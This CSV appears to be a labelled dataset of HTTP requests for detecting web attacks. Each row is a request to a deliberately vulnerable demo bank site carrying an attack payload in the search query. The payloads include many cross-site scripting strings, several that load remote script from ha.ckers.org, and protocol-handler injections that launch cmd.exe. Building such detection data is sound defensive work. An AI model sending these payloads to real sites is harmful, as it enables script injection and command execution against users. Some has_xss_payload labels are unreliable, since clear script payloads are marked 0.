method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time
GET,http://demo.testfire.net/search.jsp?query=<script>+alert(1)+</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,660
GET,"http://demo.testfire.net/search.jsp?query=aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,618
GET,"http://demo.testfire.net/search.jsp?query=firefoxurl:test|"" -new-window javascript:alert(\'Cross%20Browser%20Scripting!\');""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,1530
GET,"http://demo.testfire.net/search.jsp?query=navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%2c{}%2c0);alert(process)","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,597
GET,http://demo.testfire.net/search.jsp?query=res://c:\\program files\\adobe\\acrobat 7.0\\acrobat\\acrobat.dll/#2/#210,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,593
GET,http://demo.testfire.net/search.jsp?query=<script>alert('xss')</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,289
GET,"http://demo.testfire.net/search.jsp?query=<script>alert(string.fromcharcode(88,83,83))</script>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,289
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,288
GET,http://demo.testfire.net/search.jsp?query='> <script>alert(3)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,314
GET,http://demo.testfire.net/search.jsp?query=`> <script>alert(5)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,312
GET,http://demo.testfire.net/search.jsp?query=> <script>alert(4)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,303
GET,"http://demo.testfire.net/search.jsp?query=<<script>alert(""xss"");//<</script>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,"http://demo.testfire.net/search.jsp?query=>""'","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,302
GET,"http://demo.testfire.net/search.jsp?query='';!--""<XSS>=&{()}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295
GET,http://demo.testfire.net/search.jsp?query=*/a=eval;b=alert;a(b(/e/.source));/*,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,297
GET,http://demo.testfire.net/search.jsp?query='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,294
GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,292
GET,http://demo.testfire.net/search.jsp?query=&#39);x=alert;x(&#40 /finally through!/.source &#41);//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,304
GET,http://demo.testfire.net/search.jsp?query=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,309
GET,"http://demo.testfire.net/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,307
GET,"http://demo.testfire.net/search.jsp?query=<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""XSS"")>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,309
GET,"http://demo.testfire.net/search.jsp?query=perl -e 'print ""<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279
GET,"http://demo.testfire.net/search.jsp?query=<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV> ","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,275
GET,"http://demo.testfire.net/search.jsp?query=<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,275
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,324
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,328
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,323
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,323
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,311
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,299
GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,302
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,298
GET,"http://demo.testfire.net/search.jsp?query=(1?(1?{a:1?""""[1?""ev\a\l"":0](1?""\a\lert"":0):0}:0).a:0)[1?""\c\a\l\l"":0](content,1?""x\s\s"":0)","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,307
GET,"http://demo.testfire.net/search.jsp?query=<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300
